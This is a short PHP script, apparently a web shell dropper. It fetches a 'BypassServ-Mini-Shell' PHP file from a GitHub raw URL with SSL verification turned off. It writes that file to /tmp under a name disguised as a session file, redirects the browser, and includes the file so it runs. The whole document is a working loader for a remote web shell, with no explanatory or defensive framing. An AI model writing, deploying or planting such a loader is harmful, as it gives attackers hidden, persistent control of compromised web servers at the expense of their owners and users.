<?php
$tmpfile = 'sess_'.md5('naxtarrr').'.php';
$data = ['https://raw.githubusercontent.com/im-hanzou/BypassServ-Mini-Shell/main/bypasserv-new.php', "/tmp/$tmpfile"];
 
if(!file_exists($data[1]) || filesize($data[1]) === 0) {
    $context = stream_context_create([
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false,
        ],
    ]);

    $fopen = fopen($data[1], 'w+');
    fwrite($fopen, file_get_contents($data[0], false, $context));
    fclose($fopen);
    echo '<script>window.location="?naxtarrr";</script>';
}

include($data[1]);
?>
